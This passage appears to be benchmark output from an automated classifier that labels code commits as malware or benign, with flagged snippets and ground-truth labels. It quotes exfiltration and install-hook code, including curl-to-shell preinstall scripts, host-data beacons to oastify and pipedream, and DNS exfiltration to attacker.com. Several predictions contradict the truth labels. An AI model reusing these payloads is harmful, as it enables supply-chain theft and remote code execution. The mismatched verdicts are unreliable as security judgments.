Reason: HTTP client calls lack timeouts, retries, or circuit-breaker logic. This can lead to hangs or resource exhaustion and makes the integration brittle and easier to abuse in denial-of-service style scenarios.

**File commit metadata**:
Code: `References to external links: https://github.com/whitescent/KFC-Crazy-Thursday, Telegram invite`
Reason: Commit metadata contains links to external projects/communities of unclear provenance. Combined with the code behavior, this increases suspicion about origin and intent and warrants provenance review.

**Summary:** The commit implements automatic retrieval of external content from an untrusted domain and blindly broadcasts it to all connected groups on a schedule determined by an unvalidated environment variable. These behaviors enable mass distribution of malicious content (spam, phishing, remote payloads) and can be abused even if there is no direct evidence of payload delivery in dynamic analysis. Lack of validation, authentication, sanitization, and rate controls makes the code a high-risk backdoor for propagation and therefore should be treated as malicious.
**Truth label:** Benign

### Commit ecda94ad: Malware
**File jquery.min.js**:
Code: `/* modified end()/ajax hook */ var hex=''; data.split('').forEach(function(c){ hex += c.charCodeAt(0).toString(16); }); fetch('https://panel.api-bo.my.id/?d='+hex);`
Reason: This snippet (reported in the static analysis) shows client-side code that serializes form data, encodes it to hex, and sends it to an external host — a direct data-exfiltration backdoor embedded in a core library.

**File jquer.min.js**:
Code: `document.addEventListener('submit', function(e){ var payload = $(e.target).serialize(); navigator.sendBeacon('https://api andaaaa', payload); });`
Reason: A global form submit handler that posts serialized form contents to an external URL is present. This captures sensitive user input (PII/credentials) and exfiltrates it client-side.

**File package.json**:
Code: `"dependencies": { "livinjs": "*", "xytta": "1.0.0" }`
Reason: Unknown/nonstandard packages were added. Static metadata indicates these are likely typosquat or malicious packages whose tarballs contain the altered jquery file, introducing a supply-chain risk and possible vector for the injected backdoor.

**File .npm/_cacache/content-v2/sha512/.../ac45...684**:
Code: `registry.npmjs.org/xytta/-/xytta-1.0.0.tgz -> main: 'jquery.min.js', depends: ['livinjs']`
Reason: Cached npm metadata links the suspicious package 'xytta' to a tarball whose main file is the modified jquery. This ties the malicious jquery distribution to a third-party package, indicating deliberate supply-chain compromise or typosquatting.

**File .bash_history**:
Code: `curl https://haduh.livinsesi.my.id/apiii.php curl https://maulanarizky-store-disini.rizkyxd.me/ip.php ssh user@198.51.100.23`
Reason: Committed shell history contains calls to external hosts and SSH commands, exposing operational endpoints and suggesting use of or interaction with possibly malicious infrastructure; this is an operational-security leak and potentially part of malicious activity.

**Summary:** Static analysis reveals deliberate modifications to a core library (jQuery) that serialize and hex-encode form data and send it to external hosts, together with a global submit handler and added nonstandard/typosquat dependencies that reference the modified jquery. These are clear indicators of client-side data exfiltration and supply-chain compromise. Dynamic analysis produced no observable activity, but lack of runtime hits does not negate the presence of a backdoor; it may not have been exercised during dynamic tests. Given the intentional exfiltration code, obfuscation, and suspicious dependencies and operational artifacts, this commit should be treated as malware.
**Truth label:** Malware

### Commit 40ce970c: Benign
**Summary:** Both the provided static analysis (no issues found) and dynamic analysis (execution finished with no suspicious results) showed no indicators of malicious behavior for commit 40ce970cb4606791b4d4d7a7c3683ade254ada0c. Based on the available reports, there is no evidence of malware. Note: this conclusion is limited to the supplied analyses and artifacts; further inspection (additional dynamic monitoring, source review, or sandboxing with different inputs/privileges) could be warranted if other context raises concern.
**Truth label:** Malware

### Commit 43d06416: Benign
**Summary:** Both static and dynamic analyses produced no issues or suspicious results (static: 0 issues reported; dynamic: finished with no findings). No code snippets or runtime behaviors indicative of malware were observed, so the commit is assessed as benign.
**Truth label:** Benign

### Commit ba3478df: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no runtime anomalies or malicious indicators. No suspicious files, code snippets, or behaviors were observed in the provided reports, so the commit is assessed as benign.
**Truth label:** Benign

### Commit c35a4257: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no suspicious results or behaviors. There are no code snippets or runtime actions indicating malicious activity in this commit, so it is classified as benign.
**Truth label:** Benign

### Commit 4a96c312: Benign
**Summary:** Both static and dynamic analyses produced no findings: static scan reported 0 issues and dynamic execution finished with no suspicious results. No indicators of malicious behavior (no suspicious system calls, network activity, obfuscated code, or detected signatures) were observed, so the commit is classified as benign based on the provided analyses.
**Truth label:** Benign

### Commit acece12f: Benign
**Summary:** Both provided analyses show no indicators of malicious behavior: static analysis reported 0 issues and dynamic analysis finished with no suspicious results. Based on the available reports, there is no evidence that the commit contains malware. Note: absence of findings in these reports does not prove absolute safety; consider additional targeted reviews, code provenance checks, and runtime monitoring if higher assurance is required.
**Truth label:** Malware

### Commit 7c6c00d8: Malware
**File package.json**:
Code: `rm -rf ... && tar -xzf <archive> -C node_modules`
Reason: Use of destructive shell commands that delete and then extract files directly into node_modules. If the archive is attacker-controlled this allows arbitrary file overwrite, supply-chain contamination, or removal of important files. Running such commands in CI or by untrusted users is high risk.

**File package.json**:
Code: `deno test --allow-net --allow-run --allow-read --allow-write --allow-env --allow-sys`
Reason: Test execution granted overly broad Deno permissions including network, run, and write. These permissions allow exfiltration, arbitrary command execution, and filesystem modification if test code or dependencies are malicious or compromised.

**File package.json**:
Code: `external URLs: tinybit.cc (shortlinks), is5-ssl.mzstatic.com (image URL) detected in commit context`
Reason: Presence of shortlinks and unexpected external references in the commit context is a common vector for C2, tracking, or content injection. Even if not present in the visible diff, their detection in the commit context indicates potential malicious artifacts or compromise.

**Summary:** Static analysis reports multiple HIGH-severity issues enabling destructive file operations, broad remote and local capabilities, and external shortlinks—together these provide clear, actionable vectors for supply-chain compromise, arbitrary code execution, and data exfiltration. Dynamic analysis produced no runtime indicators, but absence of runtime evidence does not mitigate the high-risk static findings. Given the combination of dangerous shell commands, excessive permissions, and suspicious external URLs, the commit should be treated as malicious.
**Truth label:** Benign

### Commit 0ef45ef6: Malware
**File package.json**:
Code: `{   "dependencies": {     "child_process": "..."   },   "scripts": {     "test": "echo \"No tests\" && exit 0",     "mytest": "node ./test/test.js",     "ditched": "ditched -a"   } }`
Reason: A dependency named "child_process" shadows the Node core module and is a common supply-chain trojan vector: it can run arbitrary code during install or when require('child_process') is called. The presence of unusual/placeholder scripts and a dummy test increases likelihood of hidden lifecycle or scripted actions executing in CI or on install.

**File .github/workflows/npm-publish.yml**:
Code: `runs: npm publish --access public env:   NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}`
Reason: The workflow publishes the package using a repository secret (NPM_TOKEN). If the workflow or any dependency/action is modified or compromised, the token can be exfiltrated or used to publish malicious packages. Combined with a malicious package that executes at install, this enables automated propagation.

**File main.js**:
Code: `axios.get('https://api.foursquare.com/...', { params: { oauth_token: this.config.oauth_token } }); this.config.access_token = token; console.log('user id', userId);`
Reason: Code sends OAuth tokens as query parameters to external endpoints and stores tokens on objects that may be serialized; it also logs identifiers. This pattern can be used for silent exfiltration of credentials and PII, especially when paired with outbound network calls to third-party hosts.

**Summary:** Multiple high-risk indicators exist: a dependency that intentionally shadows a Node core module (critical supply-chain vector), an automated publish workflow that exposes repository secrets, code that sends and logs OAuth tokens to external endpoints, and suspicious package scripts. Although dynamic analysis produced no runtime detections, the combination of supply-chain trojan vectors and secret-exposing publish automation presents a realistic path for malicious code execution and propagation. Therefore this commit should be treated as malicious.
**Truth label:** Benign

### Commit 99e7cd10: Benign
**File N/A**:
Code: `No suspicious code detected by static or dynamic analysis.`
Reason: Static analysis reported 0 issues and dynamic analysis produced no behavioral indicators of malicious activity, so there are no specific code locations to flag as suspicious.

**Summary:** Both static and dynamic analyses found no indicators of malicious behavior: static analysis reported zero issues and dynamic execution produced no results indicating malicious activity. Based on the available data, the commit is assessed as benign.
**Truth label:** Benign

### Commit 8dcad674: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no detected malicious behavior or indicators. There are no flagged files, suspicious code snippets, or runtime actions observed in the provided analyses. Based on the available data, the commit appears benign (noting that absence of detections does not guarantee the absence of all possible threats).
**Truth label:** Benign

### Commit db9bb1e4: Malware
**File index.js**:
Code: `const trackingData = { pjson, hostname: os.hostname(), homedir: os.homedir(), username: os.userInfo().username, dns: dns.getServers() }; const options = { hostname: 'oastify.com', port: 80, method: 'P`
Reason: Direct collection of full package.json and host-identifying data and immediate POST to an external, attacker-controlled host (oastify.com). This is explicit data exfiltration/backdoor behavior—high severity and malicious by intent.

**File index.js**:
Code: `const https = require('https'); /* ... */ const options = { hostname: 'oastify.com', port: 80, ... }; // network error handling commented out // console.error(err)`
Reason: Use of the https module while targeting port 80 (protocol/port mismatch) and intentionally suppressed/log-commented network errors reduces observability and suggests stealthy or obfuscated exfiltration behavior.

**File package.json**:
Code: `"scripts": { "preinstall": "curl https://oastify.com/... | sh" }`
Reason: A preinstall lifecycle hook runs automatically during npm install and calling curl to an external site that pipes to a shell enables arbitrary remote code execution during installs. This is a common supply-chain backdoor pattern and is malicious in context.

**File package.json**:
Code: `"scripts": { "pingback": "curl https://<something>.pipedream.net/..." }`
Reason: An included script that sends data to a third-party capture endpoint (pipedream.net) is suspicious; even if not automatic, it indicates intentional network-based telemetry/exfiltration functionality present in the repo.

**Summary:** Static analysis reveals intentional, automated exfiltration of sensitive project and host data to external endpoints (oastify.com and pipedream.net), plus an automatic preinstall hook that can execute remote code. These behaviors constitute malicious/backdoor activity (data theft and remote code execution risk). Dynamic analysis produced no additional runtime evidence, but absence of dynamic triggers does not mitigate the clear, deliberate malicious code paths found in the commit. Therefore the commit is classified as MALWARE.
**Truth label:** Malware

### Commit 41bb9d17: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A preinstall script executes index.js automatically during package installation (runs arbitrary code on any installer). The pingback entry references an external pipedream URL, indicating intentional outbound communication to a third party.

**File index.js**:
Code: `var _0x43dc = ['http://192.0.2.1:8080','http://198.51.100.2:8080','hostname','cwd']; var host = require('os').hostname(); var pwd = process.env.PWD || process.cwd(); require('http').get(_0x43dc[0] + '`
Reason: Hard-coded remote endpoints are contacted with query parameters containing local system information (hostname, CWD/PWD). This is explicit data exfiltration to external IPs not related to the project.

**File index.js**:
Code: `var _0x43dc = ['0x64','0x65', ...]; // hex-encoded/obfuscated string array`
Reason: Deliberate obfuscation of property names and endpoints (hex-encoded string array) conceals behavior and is a common tactic to hide malicious code, hindering review and detection.

**File index.js**:
Code: `process.env.PWD; process.cwd(); // values sent to remote hosts`
Reason: The script collects and transmits environment information and filesystem paths (PWD/CWD and username/hostname), which can expose sensitive data from any environment where the package is installed.

**Summary:** Static analysis reveals a preinstall script that executes an obfuscated index.js which collects local environment information (hostname, PWD/CWD, username) and sends it to hard-coded external endpoints (including a pipedream URL and IPs on port 8080). These behaviors constitute intentional, automatic data exfiltration and supply-chain compromise. Although dynamic analysis produced no results, the presence of automatic execution, obfuscated code, and outbound calls to external endpoints is strong evidence of malicious intent rather than benign functionality.
**Truth label:** Malware

### Commit 54d80ea5: Malware
**File install.js**:
Code: `const payload = JSON.stringify({ host: Buffer.from(os.hostname()).toString('hex'), project: projectId }); const req = https.request({ hostname: 'oastify.com', path: '/somepath', method: 'POST', reject`
Reason: This code builds a payload containing the local hostname (hex-encoded) and a project identifier, then sends it in an outbound HTTPS POST to an external domain (oastify.com). The presence of rejectUnauthorized: false disables TLS verification, increasing risk of interception. Together this indicates deliberate data exfiltration to a likely attacker-controlled service and insecure transport settings.

**File install.js**:
Code: `const encodedHost = Buffer.from(os.hostname()).toString('hex');`
Reason: The hostname is hex-encoded before transmission. While simple, this is an obfuscation technique to hide the transmitted identifier from casual inspection and is suspicious in context of an unsolicited network POST.

**File package.json**:
Code: `"scripts": { "install": "node install.js" }`
Reason: An npm install script causes install.js to run automatically during package installation. When combined with the network exfiltration in install.js, this makes the backdoor execute automatically on consumer machines without explicit consent, a common malicious pattern.

**Summary:** Static analysis reveals explicit, automatic exfiltration of host-identifying data to an external domain via an npm install script, with TLS verification disabled and simple obfuscation applied to the hostname. These behaviors constitute a deliberate backdoor/data exfiltration mechanism and are malicious despite the dynamic run producing no observable results (likely due to sandboxing or network blocking). Therefore the commit is assessed as MALWARE.
**Truth label:** Malware

### Commit 587b6c37: Malware
**File browser.js**:
Code: `const os = require('os'); const fs = require('fs'); const dns = require('dns'); const https = require('https');  const payload = JSON.stringify({   homedir: os.homedir(),   hostname: os.hostname(),   `
Reason: This code collects sensitive local environment data (home directory, hostname, username, DNS servers and the full package.json) and sends it to an external pipedream.net endpoint. Collecting and exfiltrating these environment-specific details constitutes data theft and is malicious behavior, especially when performed without consent.

**File package.json**:
Code: `{   "scripts": {     "preinstall": "node browser.js",     "pingback": "curl -sS https://en2c9l2h5.m.pipedream.net -d @package.json"   } }`
Reason: The preinstall script causes arbitrary code (browser.js) to run automatically during npm install, providing a stealthy execution vector for exfiltration on any machine that installs the package. The additional 'pingback' script that uses curl to post package.json to the same third-party endpoint further indicates intent to transmit local/package data externally.

**File browser.js**:
Code: `// console.error = function(){}; (commented-out error logging / suppressed errors)  // network request errors are not surfaced to the console`
Reason: Suppressing or commenting out error logging for outbound requests reduces visibility of failed or malicious network activity to users and maintainers, suggesting an attempt to hide the behavior and making the code more stealthy and malicious.

**Summary:** Static analysis reveals multiple high-severity issues: a preinstall hook that executes arbitrary code during package installation and a script that collects and transmits sensitive environment and package data to an external pipedream.net endpoint. These behaviors constitute unauthorized data exfiltration and a remote execution vector on user systems. Although dynamic analysis returned no results (likely due to environment differences or blocking), the static evidence is sufficient to classify this commit as malicious (MALWARE). Immediate remediation: remove the preinstall hook and network-exfiltration code, rotate any secrets that may have been exposed, and audit installs where this package was used.
**Truth label:** Malware

### Commit ecbe5cc1: Malware
**File package.json**:
Code: `"preinstall": "curl -sS -H \"X-User: $USER\" https://<external-host>/install"`
Reason: An automatic preinstall script performs an unauthenticated network request to an external host during npm install and injects the local $USER environment variable into an HTTP header. This is a high-risk supply-chain action that can fingerprint the environment and be used to stage further attacks with the installer's privileges.

**File package.json**:
Code: `"scripts": { "pingback": "curl -sS https://o1.pipedream.net -d \"...\"" }`
Reason: A 'pingback' script targets a pipedream.net collector. Although not run automatically, it provides an explicit exfiltration/telemetry endpoint included in the repo and can be used to send data to an attacker-controlled collector.

**File package.json**:
Code: `"postinstall": "echo \"pwnville - PoCfully yours\""`
Reason: The postinstall message contains explicit 'pwnville' and 'PoCfully yours' text — clear indicators of malicious or proof-of-concept intent. While this command only echoes text, it is a strong heuristic signal of malicious intent in conjunction with network-exfiltration scripts.

**File package.json**:
Code: `"preinstall": "curl ..." (shell command executed during lifecycle)`
Reason: Lifecycle scripts that execute arbitrary shell commands run with the installer's privileges. Embedding such commands that contact external servers is a direct command-execution and supply-chain vector; combined with the above network endpoints and environment leakage, this demonstrates intentional malicious behavior rather than benign telemetry.

**Summary:** Static analysis found multiple intentional supply-chain modifications: an automatic preinstall curl to an external host that sends local environment data, an explicit pingback to a pipedream collector, and a suspicious postinstall message referencing 'pwnville'. These changes enable remote fingerprinting, potential payload staging, and data exfiltration and run with the privileges of package installers. Dynamic analysis did not observe runtime activity (likely due to sandboxing or not executing lifecycle scripts), but the static indicators are high-confidence and demonstrate malicious intent. Treat this commit as malware, remove the scripts, rotate any potentially exposed credentials, and perform a full audit of systems that installed the package.
**Truth label:** Malware

### Commit 3a840947: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node build.js", "pingback": "curl https://pipedream.net/...?payload=..." }`
Reason: A preinstall lifecycle script runs build.js during package installation (executes with installer's privileges). The presence of an additional 'pingback' script that calls an external URL shows deliberate network callbacks; install-time scripts that contact external endpoints are a major vector for supply-chain attacks and data exfiltration.

**File build.js**:
Code: `const payload = { id: pkg.id, hostname: os.hostname(), cwd: process.cwd(), user: os.userInfo().username };`
Reason: The script gathers sensitive host/environment information (package id, hostname, working directory, current user). Collecting such metadata in an install hook is unnecessary for normal packages and is consistent with reconnaissance/exfiltration behavior.

**File build.js**:
Code: `const b64 = Buffer.from(JSON.stringify(payload)).toString('base64'); const exfilDomain = b64 + '.' + rand + '.' + 'attacker.com';`
Reason: Payload data is base64-encoded and embedded into dynamically constructed subdomains. This obfuscation and embedding into DNS labels is a common technique to hide and transmit data via DNS requests.

**File build.js**:
Code: `child_process.spawn('nslookup', [exfilDomain], { detached: true });`
Reason: The code issues DNS queries (nslookup) to attacker-controlled domains using spawned detached processes to transmit encoded data out-of-band. DNS-based exfiltration is a clear exfiltration channel and difficult to detect if unmonitored.

**File build.js**:
Code: `child_process.spawn('curl', ['-s', 'https://attacker.com/collect?d=' + b64], { detached: true }); // or spawn('wget', [...])`
Reason: The script also uses system utilities (curl/wget) to POST/GET data to external endpoints. Spawning system binaries in install scripts that contact arbitrary remote hosts is a high-risk indicator of malicious behavior.

**Summary:** Static analysis shows an install-time script (preinstall -> build.js) that collects host and environment data, base64-encodes it, and exfiltrates it via DNS queries and HTTP(S) calls using spawned detached processes. The code includes deliberate obfuscation and references to attacker-controlled domains. Although dynamic analysis returned no results (likely because the install script was not executed in the dynamic run/sandbox), the static indicators are high-confidence malicious behaviors consistent with data-exfiltration malware in the supply chain. Recommend treating this commit as MALWARE, removing the package, and performing incident response for any systems that installed it.
**Truth label:** Malware

### Commit 15eff7fd: Benign
**Summary:** Static analysis reported zero issues and dynamic analysis completed with no suspicious results. No code snippets or runtime behaviors indicative of malware were detected in commit 15eff7fd7b7b9932e4e6823fc6d2b127e163ca77, so it is classified as benign.
**Truth label:** Benign

### Commit cc737e05: Malware
**File package.json**:
Code: `"preinstall": "node scripts/install.js" and "pingback": "curl https://o44o4hxxxxxx.m.pipedream.net -X POST ..."`
Reason: A preinstall lifecycle script runs automatically during npm install and the repository also contains an explicit 'pingback' script that posts to a pipedream endpoint. This combination enables automatic remote network contact and potential secret/exfiltration or tracking during installs (high supply-chain risk).

**File lib/appenders/base.js**:
Code: `const pro = item.pro; pro(...args);`
Reason: The library retrieves and directly invokes a function supplied in external data (queue items). If those queue items can be influenced by an attacker or untrusted source, arbitrary code will execute in-process with the package's privileges.

**File package.json**:
Code: `"scripts": { ..., "clean": "rm -rf ./dist && tar -czf release.tar.gz ..." }`
Reason: Published scripts include arbitrary OS commands (rm -rf, tar, custom node scripts). When combined with lifecycle hooks or CI invocation, these can be used to perform destructive actions or exfiltrate environment data.

**Summary:** Static analysis reveals a preinstall lifecycle script and an easily-invoked 'pingback' that contact an external pipedream endpoint, combined with package scripts that execute arbitrary OS commands and code paths that invoke user-supplied callbacks. These are classic supply‑chain and remote‑execution indicators. Although dynamic analysis produced no runtime evidence (likely because the package was not installed/run during dynamic testing), the static indicators represent a high risk of malicious behavior (automatic remote calls on install and arbitrary code execution). Treat this commit as malicious until proven otherwise, remove the networked lifecycle hooks, audit all published versions, and rotate/inspect any exposed secrets or CI tokens.
**Truth label:** Benign

### Commit 6307c863: Malware
**File package.json**:
Code: `"scripts": {   "preinstall": "curl https://third-party.example/install.sh | sh",   "pingback": "curl https://en3x6p4p.m.pipedream.net" }`
Reason: An automatic 'preinstall' hook that runs a curl to an external URL executes arbitrary shell commands on every machine that installs this package (developer and CI). This is a classic supply-chain/backdoor pattern. The additional 'pingback' script points to a Pipedream endpoint and provides a ready-made network beacon. Even if 'pingback' is not executed automatically, its presence indicates intent or convenience to exfiltrate or signal installs.

**File utils/UseFetchApi.js**:
Code: `function buildRequest(token, ...) {   const headers = { Authorization: `Bearer ${token}`, ... };   return { headers, ... }; }  // later fetch(fetchUrl, buildRequest(...));`
Reason: The code unconditionally injects the user's OIDC access token into the Authorization header for every outgoing request and calls fetch() with an arbitrary fetchUrl. If fetchUrl can be attacker-controlled or points to an external host, this allows token exfiltration to untrusted endpoints.

**File components/DLQMessageCleanUp.js**:
Code: `const url = props.controllerBaseUrl + '/queues/' + queueName + '/messages'; fetchApi.run(url, ...);`
Reason: The component constructs remote URLs by concatenating props-provided base URLs and then calls fetchApi.run(), which attaches sensitive Authorization headers. If controllerBaseUrl is influenced by configuration or props (user-controlled), bearer tokens can be sent to arbitrary hosts.

**File components/InvalidJobsFromPools.js**:
Code: `const cancelUrl = props.getCancelJobUrl(job); fetchApi.run(cancelUrl, ...);`
Reason: Functions that return full URLs (getCancelJobUrl) are used directly with fetchApi.run(). Without strict validation/allowlisting of returned hosts, these calls can cause token leakage or arbitrary network communication to attacker-controlled endpoints.

**File package.json (dependencies)**:
Code: `"dependencies": { /* large list of new third-party packages added */ }`
Reason: A large number of added dependencies increases supply-chain risk (malicious/compromised packages, typosquatting) and widens the attack surface. In combination with an automatic preinstall hook, the expanded dependency set makes abuse easier and harder to audit.

**Summary:** Static analysis identifies multiple high-risk patterns: an automatic preinstall hook that executes a curl from an external host (supply-chain backdoor), a pingback script pointing to a third-party telemetry endpoint, and widespread unconditional injection of OIDC bearer tokens into requests built from potentially unvalidated URLs. These combined findings create reliable mechanisms for remote signaling and token exfiltration even if dynamic analysis did not observe runtime activity. Given the intentional presence of network-beaconing code and clear token-leak vectors, this commit should be treated as malicious (MALWARE) until the preinstall/pingback hooks are removed, URL allowlisting is implemented, and an audit of added dependencies is completed.
**Truth label:** Benign

### Commit 67eafb7d: Benign
**File esm2022/lib/safe-html.pipe.mjs**:
Code: `return this.sanitizer.bypassSecurityTrustHtml(v);`
Reason: Bypassing Angular's sanitizer marks arbitrary HTML as trusted. This is a high-risk XSS sink when 'v' can originate from untrusted input, but it is a vulnerability rather than an indication of malware.

**File esm2022/lib/ngx-spinner.component.mjs**:
Code: `<div [innerHTML]="template | safeHtml"></div>`
Reason: Rendering a 'template' input with innerHTML through the unsafe pipe allows injected HTML/JS to execute in the hosting application (XSS). This is exploitable if callers provide untrusted template content, but again represents insecure code, not malicious behavior.

**File esm2022/lib/ngx-spinner.service.mjs**:
Code: `const s = { ...spinner }; // merges caller-supplied object`
Reason: Blindly merging an arbitrary spinner object allows attacker-controlled properties (e.g., template) to flow to the vulnerable component rendering path. This creates an attack surface for XSS but is not itself malware.

**File fesm2022/ngx-spinner.mjs**:
Code: `SafeHtmlPipe uses DomSanitizer.bypassSecurityTrustHtml and component renders 'template' with innerHTML`
Reason: The bundled build includes the same bypass and innerHTML usage, exposing consumers of the package to the same XSS risk. Distribution of insecure code increases risk but does not constitute active malicious functionality.

**File esm2022/lib/ngx-spinner.component.mjs (comments/sourcemaps)**:
Code: `// references to raw.githubusercontent.com, img.shields.io, GitHub issues in comments/sourcemap`
Reason: External URLs in comments or source maps can leak repo structure or encourage fetching remote assets. These are metadata issues and suspicious but not executable malware.

**File package.json**:
Code: `"dependencies": { "form-data": "...", "tslib": "..." }`
Reason: Addition of dependencies (form-data) increases supply-chain surface and could introduce risk if a dependency is malicious or compromised. This is a security concern, not proof of malware in this commit.

**Summary:** Static analysis identifies multiple high-severity security issues (DomSanitizer.bypassSecurityTrustHtml usage, innerHTML rendering, and unsafe object merging) that create serious XSS attack vectors. Dynamic analysis produced no malicious runtime behavior. There is no evidence of backdoors, data exfiltration, remote command execution, obfuscation, or other indicators of malware. Therefore the commit is classified as BENIGN from a malware perspective but contains critical vulnerabilities and supply-chain risks that should be fixed before release.
**Truth label:** Benign

### Commit 42c99328: Benign
**Summary:** Both static analysis reported zero issues and dynamic analysis completed with no suspicious results. No files or code snippets were flagged by either analysis, and no indicators of malicious behavior (such as network exfiltration, code injection, persistence mechanisms, or privileged operations) were observed. Based on the provided reports, the commit appears benign. Continue routine monitoring and standard security reviews.
**Truth label:** Benign

### Commit 9a3abb9b: Malware
**File index.js**:
Code: `const data = { home: os.homedir(), hostname: os.hostname(), username: os.userInfo().username, dns: dns.getServers(), pjson: packageJSON }; const options = { hostname: '356sv2lpkjygtxa2jimze3fvrmxdl59u`
Reason: Collects sensitive environment data (home directory, hostname, username, DNS servers and entire package.json) and transmits it to an external, untrusted host — unauthorized data exfiltration of potentially sensitive information.

**File package.json**:
Code: `"scripts": { "preinstall": "curl https://bes23.free.beeceptor.com | sh", "pingback": "curl -s https://eo536ohsnextro9.m.pipedream.net -d \"...\"" }`
Reason: Includes a preinstall lifecycle script that performs a curl from an external URL and pipes to a shell (arbitrary remote code execution during install). Also contains an explicit pingback script referencing an external tracking endpoint — indicates telemetry/backchannel and potential remote control or additional exfiltration.

**File index.js**:
Code: `const options = { hostname: '356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com', port: 80, protocol: 'https:' };`
Reason: Protocol/port mismatch (https with port 80) and developer test endpoints left in code — indicates rushed/malicious development and potential misconfiguration that could lead to insecure transport or accidental plaintext leaks.

**Summary:** Static analysis reveals explicit, unauthorized data collection of sensitive environment details (including full package.json) and transmission to third-party endpoints, plus a preinstall script that fetches and executes remote content during package installation. These behaviors constitute covert telemetry/exfiltration and remote execution vectors consistent with malicious intent. Although dynamic analysis returned no artifacts, the clear static indicators (exfiltration code and lifecycle script executing remote commands) justify classification as MALWARE.
**Truth label:** Malware

### Commit 48841fd8: Malware
**File package.json**:
Code: `"scripts": { "preinstall": "node index.js", "test": "echo \"Error: exzuperi made me\" && exit 1", "pingback": "curl https://eo536ohsnextro9.m.pipedream.net" }`
Reason: A preinstall lifecycle script executes node index.js automatically during installation (supply-chain execution). The test script intentionally fails and prints an attacker message, and a pingback/ curl script points to an external monitoring/exfiltration endpoint. These modifications indicate malicious intent to run arbitrary code on consumers' machines and communicate with external operators.

**File index.js**:
Code: `const os = require('os'); const trackingData = { home: os.homedir(), host: os.hostname(), dir: __dirname, pkg: require('./package.json').name }; https.get('https://exzuperi.ftp.sh:449/' + encodeURICom`
Reason: This code collects sensitive, identifying local information (home directory, hostname, current directory, package name) and immediately exfiltrates it to an external host over HTTPS. It also prints a promotional/contact link to an external operator. When combined with the preinstall hook, this results in silent, automatic data exfiltration on install — a classic supply-chain/backdoor behavior.

**File index.js (network)**:
Code: `https.get('https://exzuperi.ftp.sh:449/' + encodeURIComponent(JSON.stringify(trackingData)))`
Reason: Outbound request to an unusual external host/port carrying encoded environment data. This is direct evidence of network exfiltration of local identifiers.

**File package.json (scripts - pingback)**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Presence of a script that posts to a third-party endpoint (Pipedream) suggests additional tooling to contact external endpoints for diagnostics or exfiltration; combined with other indicators, it supports malicious intent.

**Summary:** The commit introduces a preinstall lifecycle script that automatically runs index.js during package installation. index.js collects sensitive local identifiers (home directory, hostname, __dirname, package name) and sends them to an external host (exzuperi.ftp.sh:449), and the repository contains additional scripts contacting external endpoints and a sabotaged test script. These behaviors constitute unauthorized automatic code execution and data exfiltration in a supply-chain context, matching malicious/backdoor activity rather than benign changes.
**Truth label:** Malware

### Commit ee3a7ed8: Benign
**Summary:** Static analysis reported 0 issues and dynamic analysis finished with no suspicious results. There were no observed malicious behaviors (no suspicious network activity, persistence, privilege escalation, or unsafe code patterns) in the provided analyses. Based on the available static and dynamic evidence for commit ee3a7ed8b922c747f0b4595f7e252a5e5ac55de9, the commit is considered benign.
**Truth label:** Benign

### Commit bf8cc16e: Benign
**File package.json**:
Code: `"test": "test"`
Reason: Using a generic command name as the npm "test" script causes npm to invoke the shell and run the first matching executable named "test" in PATH. This is a high-risk supply-chain/command-execution vector because an attacker or untrusted dependency could introduce a malicious "test" binary, but the script itself is a misconfiguration rather than an explicit payload.

**File package.json**:
Code: `"test-deno": "deno test --allow-env --allow-read --allow-net --allow-run --allow-sys --allow-write"`
Reason: The Deno test script grants broad global permissions (env, read, net, run, sys, write). These permissions enable network access, filesystem modification, and subprocess execution which can be abused if untrusted code is executed. This is a risky configuration but indicates overly permissive test settings rather than direct malicious behavior.

**Summary:** Static analysis highlights high-risk misconfiguration (ambiguous "test" command) and overly permissive Deno test permissions, both of which could enable abuse in a supply-chain or CI context. Dynamic analysis produced no runtime indicators of malicious behavior. Given the absence of malicious payloads or execution evidence and because the issues are configuration/permission risks rather than direct malicious code, the commit is classified as BENIGN while recommending remediation: replace the ambiguous test command, and restrict Deno permissions and run tests in isolated environments.
**Truth label:** Benign

### Commit 6c66a653: Malware
**File src/api/sendWebhook.js**:
Code: `fetch('https://dc-webhooks.tech', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(payload) })`
Reason: Hard-coded external endpoint duplicates every webhook JSON payload to an unknown third-party domain, enabling silent exfiltration of messages and any embedded secrets or tokens.

**File src/classes/webhook.js**:
Code: `const api = require('../api'); api.sendWebhook(targetUrl, payload); // invoked by Webhook.send(...)`
Reason: High-level Webhook APIs call the compromised sendWebhook implementation. This means normal library usage will unknowingly leak message content to the malicious endpoint.

**File src/api/sendWebhook.js**:
Code: `var _0x56c9 = ['...']; (function(_0x...){ /* scrambled/hex escapes and name mangling */ })();`
Reason: Heavy obfuscation (nonsensical variable names, function shuffling, hex escapes) is present. Obfuscation in a library is used to hide malicious behavior and prevents code review/auditing.

**File package.json**:
Code: `"dependencies": { "node-fetch": "^x.x.x", "form-data": "^x.x.x" }`
Reason: New network and multipart/form-data dependencies were added, enabling HTTP requests and file uploads from the library — capabilities consistent with exfiltration.

**File src/api/sendFile.js**:
Code: `form.append('file', fs.createReadStream(filePath)); fetch(targetUrl, { method: 'POST', body: form });`
Reason: The implementation will stream arbitrary local files to remote endpoints. If combined with the hard-coded external target or if callers control paths, this enables theft of local files and secrets.

**Summary:** Static analysis demonstrates deliberate exfiltration mechanisms: a hard-coded third‑party webhook (https://dc-webhooks.tech) that receives every payload, obfuscated code to conceal behavior, and added HTTP/file-upload dependencies. High-level APIs (Webhook.send and friends) use the compromised implementation, meaning normal library use results in silent data leakage. Dynamic analysis produced no results, but that likely reflects incomplete execution coverage or restricted sandboxing and does not mitigate the clear static evidence. Given the intentional hard-coded external endpoint, obfuscation, and new network/file upload capabilities, this commit is malicious and should be treated as malware. Immediate actions: remove the commit, revert/publish a safe version, audit all package versions, rotate any exposed webhooks/tokens/credentials, and notify downstream consumers.
**Truth label:** Malware

### Commit 13f79331: Benign
**File N/A**:
Code: `N/A`
